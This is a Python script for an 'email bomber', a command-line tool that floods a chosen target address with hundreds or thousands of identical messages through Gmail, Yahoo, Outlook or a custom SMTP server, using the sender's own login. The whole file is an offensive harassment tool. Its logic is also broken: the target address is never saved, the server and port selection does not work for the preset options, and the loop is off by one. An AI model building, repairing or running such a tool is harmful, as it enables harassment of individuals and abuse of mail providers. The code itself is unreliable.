#!usr/bin/env python3
import colorama
import smtplib
import sys
import time

colorama.init(autoreset=True)

def banner():
    print(colorama.Fore.CYAN + """
    
    
    `n@$$~        <$$@n^         .u*.         ;*$#!  <M$$W            
    f$$$$$>      !$$$$$z        .v$$*.       .$$$$$..$$$$$            
    j$$$$$$~    I$$$$$$*       .n$$$$c.      .$$$$$.'$$$$$            
    j$$$$$$$+  !$$$$$$$*      .c$$$$$$#.     .$$$$$.'$$$$$            
    j$$$$$$$$<i$$$$$$$$*     .v$$$$$$$$*.    .$$$$$.'$$$$$            
    j$$$$%$$$$$$$$%$$$$*    .v$$$$I"$$$$*.   .$$$$$.'$$$$$            
    j$$$$;r$$$$$$x:$$$$*   .n$$$$;  ,$$$$c.  .$$$$$.'$$$$$            
    j$$$$, r$$$$n."$$$$*  .v$$$$I ~//&$$$$*. .$$$$$.'$$$$$//////////< 
    j$$$$,  t$$n. "$$$$* .v$$$$; 1$$$$$$$$$*..$$$$$.'$$$$$$$$$$$$$$8' 
    ?***z`   |\   `z***( ~***z: "***********] "tzf, .c************v' 
                                                                       
             .xMMMMMMMM. .}ucv`        'ncv1.  MMMMMMMMv.             
            .u$$$$$$$$$. ;$$$$B^      `8$$$$<  $$$$$$$$$*.            
            jBBBB@$$$$$. ;$$$$$$,    ^B$$$$$~  $$$$$$BBBBu.           
                 ?$$$$$. ;$$$$$$$,  ^@$$$$$$~  $$$$$(                 
                 ?$$$$$. ;$$$$B$$$;"@$$@$$$$<  $$$$$(                 
         ........{$$$$$. ;$$$$^%$$$$$$@^B$$$<  $$$$$/........         
       .n$$$$$$$$$$$$$t  ;$$$$ 'M$$$$8` B$$$<  1$$$$$$$$$$$$$z.       
      .v$$$$$$$$$$$$@|.  ;$$$$  _$$$${  B$$$<  .{B$$$$$$$$$$$$#.      
      -ffffffffffM$$$$%. ;$$$$ +$$$$$$[ @$$$<  W$$$$&ffffffffff}      
                 ?$$$$$. ;$$$${$$$Mc$$$)@$$$<  $$$$$(                 
                 ?$$$$$. ;$$$$$$$c..u$$$$$$$<  $$$$$(                                  
   ."""""""""""""t$$$$$. ;$$$$$$c.  .n$$$$$$<  $$$$$x"""""""""""""".  
 .v$$$$$$$$$$$$$$$$$$$$. ;$$$$$u.    .j$$$$$<  $$$$$$$$$$$$$$$$$$$$*. 
.u$$$$$$$$$$$$$$$$$$$$W  "$$$$j        /$$$$;  z$$$$$$$$$$$$$$$$$$$$*.
        
                                                                   
""")
    time.sleep(2)

class mail_bmbr:
    count = 0

    def __init__(self):
        self.target = ""
        try:
            print(colorama.Fore.BLUE + "\n  +[+[+[ Initializing Program ]+]+]+\n")
            print(colorama.Fore.RED + '\n  -[-[-[ Press "CTRL + C" to Abort anytime]-]-]-\n')

            time.sleep(2)
            target_email = self.target + input(colorama.Fore.GREEN + "\n  Enter target email : ")
            if not target_email:
                print(colorama.Fore.RED + "  \n  Error 0: Target Email Not Specified")
                sys.exit(0)
            time.sleep(1)
            self.mode = int(input(colorama.Fore.GREEN + "\n  Enter BMB mode(1,2,3,4) \n\n  1:(1000 Emails) \n  2:(500 Emails) \n  3:(250 Emails) \n  4:(custom Ammount) \n  : "))
            time.sleep(1)
            if self.mode > int(4) or int(self.mode) < int(1):
                print(colorama.Fore.RED + "\n  ERROR 1: Invalid Option. ")
                sys.exit(1)
        except Exception as e:
            print(colorama.Fore.RED + f"\n  ERROR 2: {e}")
            sys.exit(2)

    def bmb(self):
        try:
            print(colorama.Fore.BLUE + "\n  +[+[+[ Setting Up BMB ]+]+]+")
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            if self.mode == int(2):
                self.amount = int(500)
            if self.mode == int(3):
                self.amount = int(250)
            if self.mode == int(4):
                self.amount = int(input(colorama.Fore.GREEN + "\n  Choose a custom amount : "))

            print(colorama.Fore.GREEN + f"\n  +[+[+[ You Have Selected BMB mode: {self.mode} and {self.amount} emails ]+]+]+")
            time.sleep(1)

        except Exception as e:
            print(colorama.Fore.RED + f"\n  ERROR 3: {e}")
            sys.exit(3)


    def email(self):
        try:
            print(colorama.Fore.BLUE + "\n  +[+[+[ Setting Up Email ]+]+]+")
            self.server = int(input(
                colorama.Fore.GREEN + "\n  Select email server\n - \n  1: Gmail \n  2: Yahoo \n  3: Outlook \n  4: Custom port \n  : "))
            premade = [1, 2, 3]
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(colorama.Fore.GREEN + "\n  Enter Port Number : "))

            elif default_port == True:
                self.server + int(587)

            elif self.server == 1:
                self.server = "smtp.gmail.com"
            elif self.server == 2:
                self.server = "smtp.mail.yahoo.com"
            elif self.server == 3:
                self.server = "smtp-mail.outlook.com"

            self.fromAdder = str(input(colorama.Fore.GREEN + "\n\n  Enter from address : "))
            self.fromPwd = str(input(colorama.Fore.GREEN + "\n\n  Enter from password : "))
            self.subject = str(input(colorama.Fore.GREEN + "\n\n  Enter subject : "))
            self.message = str(input(colorama.Fore.GREEN + "\n\n  Enter message : "))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAdder, self.target, self.subject, self.message)
            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAdder, self.fromPwd)

        except Exception as e:
            print(colorama.Fore.RED + f"\n  ERROR 4: {e}")
            sys.exit(4)

    def send(self):
        try:
            self.s.sendmail(self.fromAdder, self.target, self.msg)
            self.count += 1
            print(colorama.Fore.YELLOW + f"BMB: {self.count}")
        except Exception as e:
            print(colorama.Fore.RED + f"\n  ERROR 5: {e}")
            sys.exit(5)

    def attack(self):
        print(colorama.Fore.BLUE + "\n  +[+[+[ ATTACKING ]+]+]+")
        for email in range(self.amount + 1):
            self.send()
        self.s.close()
        print(colorama.Fore.BLUE + "\n  +[+[+[ ATTACKING FINISHED ]+]+]+")
        sys.exit()


if __name__ =="__main__":
    try:
        banner()
        bmb = mail_bmbr()
        bmb.bmb()
        bmb.email()
        bmb.attack()
    except KeyboardInterrupt:
        print(colorama.Fore.RED + "\n  Error 6: Keyboard Interupted. Aborting Mission.")
        sys.exit(6)

